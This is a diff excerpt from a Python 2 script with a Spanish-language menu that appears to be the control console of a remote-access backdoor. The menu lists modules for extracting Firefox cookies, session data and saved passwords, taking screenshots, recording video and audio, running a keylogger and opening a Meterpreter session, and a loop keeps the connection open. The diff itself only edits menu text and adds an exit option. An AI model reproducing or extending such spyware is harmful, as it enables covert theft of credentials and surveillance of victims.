@@ -31,13 +31,14 @@ os.system(comandotty)
 print "----------------Menu---------------------------------------------------------------------------------------------------" 
 print "Escribir el comando para realizar la accion descrita"
 print "a)cookies =  Modulo de obtencion de cookies y variables de sesion del explorador Mozilla Firefox."
-print "b) captura t tiempo_segundos = Realiza 5 capturas de pantalla en el intervalo de tiempo dado."
-print "b2) captura n numero_capturas = Realiza el numero de capturas de pantalla indicadas en el instante."
+print "b) captura -t tiempo_segundos = Realiza 5 capturas de pantalla en el intervalo de tiempo dado."
+print "b2) captura -n numero_capturas = Realiza el numero de capturas de pantalla indicadas en el instante."
 print "c) captvid tiempo_segundos= Modulo para captura de video."
 print "d) captaud tiempo_segundos= Modulo para captura de audio."
 print "e) contrasenas = Modulo de obtencion de contrasenas almacenadas en el  explorador Mozilla Firefox"
 print "f) keylogger tiempo_segundos = Modulo del keylloger, especificar el tiempo en segundos en que se va ejecutar el keylogger"
 print "g) meterpreter = Modulo de sesion de meterpreter."
+print "h) close = Salir."
 print "-------------------------------------------------------------------------------------------------------------------------" 
 #Creamos un bucle para retener la conexion
 while True:
